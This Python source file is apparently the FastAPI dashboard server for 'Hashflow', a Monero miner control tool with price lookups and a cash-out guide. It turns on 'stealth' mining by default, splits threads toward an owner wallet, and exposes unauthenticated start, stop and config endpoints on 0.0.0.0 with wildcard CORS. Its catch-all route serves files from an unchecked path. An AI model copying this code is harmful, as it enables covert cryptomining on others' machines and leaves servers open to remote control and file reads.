"""
FastAPI Dashboard Server for Hashflow
Provides REST API and WebSocket for real-time mining stats
Serves static frontend
"""
import asyncio
import json
import time
import urllib.request
from pathlib import Path
from typing import Optional

from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware

from ..config import config
from ..group import group_manager
from ..stats import stats_manager

# Try to import miner status globally - will be set by main app
_miner_instance = None

def set_miner_instance(miner):
    global _miner_instance
    _miner_instance = miner

# ---------- price / earnings ----------
_price_cache = {"ts": 0.0, "data": None}
XMR_PER_KS_DAY = 0.00042  # rough offline estimate, clearly labeled

def _fetch_price() -> dict:
    now = time.time()
    if _price_cache["data"] and (now - _price_cache["ts"]) < 300:
        return _price_cache["data"]
    usd, php = 150.0, 56.0  # offline fallback estimates
    try:
        url = "https://api.coingecko.com/api/v3/simple/price?ids=monero&vs_currencies=usd,php"
        req = urllib.request.Request(url, headers={"User-Agent": "hashflow"})
        with urllib.request.urlopen(req, timeout=8) as r:
            data = json.loads(r.read().decode())
        usd = float(data["monero"]["usd"])
        php = float(data["monero"]["php"])
    except Exception:
        pass
    stats = stats_manager.get_combined_stats()
    total = stats.get("total", {})
    h = total.get("current") or 0.0
    xmr_day = (h / 1000.0) * XMR_PER_KS_DAY * 0.95
    result = {
        "xmr_usd": usd,
        "xmr_php": php,
        "hashrate": h,
        "xmr_day_est": xmr_day,
        "usd_day_est": xmr_day * usd,
        "php_day_est": xmr_day * php,
        "updated": now,
        "offline": usd == 150.0,
    }
    _price_cache["ts"] = now
    _price_cache["data"] = result
    return result

PDAX_GUIDE = [
    "1. Open your Monero wallet app and copy your XMR address",
    "2. In Hashflow, start mining - rewards go straight to that wallet",
    "3. When you have enough XMR (min ~0.05 XMR on most pools), send it to your PDAX XMR wallet",
    "4. In the PDAX app: tap XMR, then SELL to convert to PHP",
    "5. Tap Portfolio > Cash Out, choose GCash, Maya, or your bank (InstaPay, ₱15, real-time)",
    "Tip: PDAX is BSP-regulated. Never share your PDAX OTP or password.",
]

# ---------- mining control ----------
_miner_lock = __import__("threading").Lock()

def _start_miner(wallet: str, username: str, limit_cpu: float = 30.0,
                 stealth: bool = True, threads: Optional[int] = None) -> dict:
    global _miner_instance
    from ..miner import HashflowMiner, find_xmrig
    from .. import binaries

    if _miner_instance and _miner_instance.is_running():
        return {"ok": False, "error": "already_running"}

    xmrig = find_xmrig(None)
    if not xmrig:
        xmrig = binaries.ensure_xmrig(verbose=False)
    if not xmrig:
        return {"ok": False, "error": "xmrig_not_found"}

    owner = config.get("owner_wallet") or None
    from ..miner import read_owner_wallet
    if not owner:
        owner = read_owner_wallet()
    if not owner:
        owner = wallet  # solo mode

    total_threads = threads or (__import__("os").cpu_count() or 4)
    miner = HashflowMiner(
        wallet=wallet,
        owner_wallet=owner,
        xmrig_bin=str(xmrig),
        total_threads=total_threads,
        donation=float(config.get("max_donation", 0.05)),
        pool=config.get("pool"),
        limit_cpu=float(limit_cpu),
        stealth=bool(stealth),
        verbose=False,
        quiet=True,
    )
    ok = miner.start()
    if ok:
        with _miner_lock:
            _miner_instance = miner
        try:
            group_manager.register(username, group_manager.get_device_id(), wallet)
        except Exception:
            pass
        return {"ok": True, "running": True}
    return {"ok": False, "error": "start_failed"}

def _stop_miner() -> dict:
    global _miner_instance
    with _miner_lock:
        miner = _miner_instance
        _miner_instance = None
    if miner:
        try:
            miner.stop()
        except Exception:
            pass
    return {"ok": True, "running": False}

app = FastAPI(
    title="Hashflow Dashboard",
    description="Real-time Monero Mining Dashboard",
    version="1.0.0",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Static files - look for frontend in multiple locations
STATIC_CANDIDATES = [
    Path(__file__).parent / "static",
    Path(__file__).parent.parent / "dashboard" / "static",
    Path.cwd() / "app" / "frontend",
    Path.cwd() / "hashflow" / "dashboard" / "static",
]

static_dir = None
for candidate in STATIC_CANDIDATES:
    if candidate.exists():
        static_dir = candidate
        break

# Create static dir if none exists
if not static_dir:
    static_dir = Path(__file__).parent / "static"
    static_dir.mkdir(parents=True, exist_ok=True)

# Mount static if index exists, else we will serve from app/frontend
if static_dir.exists():
    # Only mount if not already handling root
    try:
        app.mount("/static", StaticFiles(directory=str(static_dir)), name="static")
    except Exception:
        pass

# Also try app/frontend
frontend_dir = Path.cwd() / "app" / "frontend"
if frontend_dir.exists():
    app.mount("/frontend", StaticFiles(directory=str(frontend_dir)), name="frontend")

@app.get("/api/status")
async def get_status():
    if _miner_instance:
        return _miner_instance.get_status()
    else:
        # Return stats only
        return {
            "running": False,
            "threads": {"total": 0, "contrib": 0, "owner": 0},
            "donation": config.get("max_donation", 0.05),
            "pool": config.get("pool"),
            "stats": stats_manager.get_combined_stats(),
            "stealth": {"enabled": False, "cpu_limit": 0, "stealth_mode": False},
            "thermal": {"overheating": False, "temperature": None},
            "xmrig": config.get("xmrig_name"),
        }

@app.get("/api/stats")
async def get_stats():
    return stats_manager.get_combined_stats()

@app.get("/api/logs")
async def get_logs(label: Optional[str] = None, limit: int = 100):
    logs = stats_manager.get_logs(label, limit)
    return {"logs": logs, "timestamp": time.time()}

@app.get("/api/group")
async def get_group():
    return group_manager.get_stats()

@app.get("/api/config")
async def get_config():
    return config.all()

@app.post("/api/config")
async def update_config(payload: dict):
    # Only allow certain keys
    allowed = {"pool", "donation", "limit_cpu", "stealth", "refresh_interval", "cpu_priority", "donate_level"}
    to_update = {k: v for k, v in payload.items() if k in allowed}
    if to_update:
        config.update(to_update)
    return config.all()

@app.get("/api/health")
async def health():
    return {"status": "ok", "timestamp": time.time(), "version": "2.0.0"}

@app.get("/api/settings")
async def get_settings():
    wallet = config.get("wallet") or ""
    return {
        "wallet": wallet[:12] + "..." + wallet[-6:] if len(wallet) > 18 else (wallet or ""),
        "has_wallet": bool(wallet),
        "username": config.get("username") or "",
        "limit_cpu": config.get("limit_cpu", 30),
        "stealth": config.get("stealth", True),
        "donation": config.get("max_donation", 0.05),
        "pool": config.get("pool"),
        "owner_configured": bool(read_owner_wallet_quiet()),
    }

def read_owner_wallet_quiet():
    try:
        from ..miner import read_owner_wallet
        return read_owner_wallet()
    except Exception:
        return None

@app.post("/api/settings")
async def save_settings(payload: dict):
    wallet = payload.get("wallet", "").strip()
    if wallet:
        if len(wallet) < 90 or wallet[0] not in ("4", "8"):
            return {"ok": False, "error": "invalid_wallet"}
        config.set("wallet", wallet)
    if payload.get("username"):
        config.set("username", str(payload["username"])[:32])
    if "limit_cpu" in payload:
        try:
            config.set("limit_cpu", max(5.0, min(100.0, float(payload["limit_cpu"]))))
        except (TypeError, ValueError):
            pass
    if "stealth" in payload:
        config.set("stealth", bool(payload["stealth"]))
    return {"ok": True}

@app.post("/api/start")
async def start_mining(payload: dict):
    wallet = payload.get("wallet") or config.get("wallet")
    if not wallet or len(wallet) < 90 or wallet[0] not in ("4", "8"):
        return {"ok": False, "error": "wallet_missing"}
    username = payload.get("username") or config.get("username") or "miner"
    config.set("wallet", wallet)
    config.set("username", username)
    result = _start_miner(
        wallet=wallet,
        username=username,
        limit_cpu=payload.get("limit_cpu", config.get("limit_cpu", 30)),
        stealth=payload.get("stealth", config.get("stealth", True)),
        threads=payload.get("threads"),
    )
    return result

@app.post("/api/stop")
async def stop_mining():
    return _stop_miner()

@app.get("/api/price")
async def get_price():
    return _fetch_price()

@app.get("/api/pdax")
async def get_pdax_guide():
    return {"steps": PDAX_GUIDE, "fee": "₱15 InstaPay", "limit": "₱50,000/transfer"}

# WebSocket for real-time stats
class ConnectionManager:
    def __init__(self):
        self.active_connections: list[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        dead = []
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except Exception:
                dead.append(connection)
        for d in dead:
            self.disconnect(d)

manager = ConnectionManager()

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            # Send stats every 2 seconds
            if _miner_instance:
                data = _miner_instance.get_status()
            else:
                data = {
                    "running": False,
                    "stats": stats_manager.get_combined_stats(),
                    "timestamp": time.time(),
                }
            await websocket.send_json(data)
            await asyncio.sleep(2.0)
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception:
        manager.disconnect(websocket)

@app.websocket("/ws/logs")
async def websocket_logs(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            logs = stats_manager.get_logs(limit=50)
            await websocket.send_json({"logs": logs, "timestamp": time.time()})
            await asyncio.sleep(1.5)
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception:
        manager.disconnect(websocket)

# Serve frontend - try multiple locations for index.html
@app.get("/")
async def serve_frontend():
    candidates = [
        static_dir / "index.html" if static_dir else None,
        Path(__file__).parent / "static" / "index.html",
        frontend_dir / "index.html",
        Path.cwd() / "app" / "frontend" / "index.html",
    ]
    for candidate in candidates:
        if candidate and candidate.exists():
            return FileResponse(str(candidate))
    # Fallback - return simple HTML if no frontend found
    return JSONResponse({
        "message": "Hashflow Dashboard API is running",
        "endpoints": ["/api/status", "/api/stats", "/api/logs", "/api/group", "/docs"],
        "frontend": "Frontend not built yet - see /docs for API",
    })

# For SPA routing, serve index.html for unknown paths (but not api)
@app.get("/{full_path:path}")
async def serve_spa(full_path: str):
    if full_path.startswith("api/") or full_path.startswith("ws") or full_path.startswith("docs") or full_path.startswith("openapi"):
        return JSONResponse({"error": "Not found"}, status_code=404)
    
    # Try to serve static file if exists
    if static_dir:
        file_path = static_dir / full_path
        if file_path.exists() and file_path.is_file():
            return FileResponse(str(file_path))
    
    if frontend_dir:
        file_path = frontend_dir / full_path
        if file_path.exists() and file_path.is_file():
            return FileResponse(str(file_path))
    
    # Fallback to index.html for SPA
    candidates = [
        static_dir / "index.html" if static_dir else None,
        frontend_dir / "index.html",
    ]
    for candidate in candidates:
        if candidate and candidate.exists():
            return FileResponse(str(candidate))
    
    return JSONResponse({"error": "Not found"}, status_code=404)

def run_server(host: str = "0.0.0.0", port: int = 8080, miner_instance=None):
    import uvicorn
    if miner_instance:
        set_miner_instance(miner_instance)
    
    # Configure uvicorn to allow preview hosts
    uvicorn.run(
        "hashflow.dashboard.server:app",
        host=host,
        port=port,
        log_level="info",
        reload=False,
        access_log=False,
    )

if __name__ == "__main__":
    run_server()
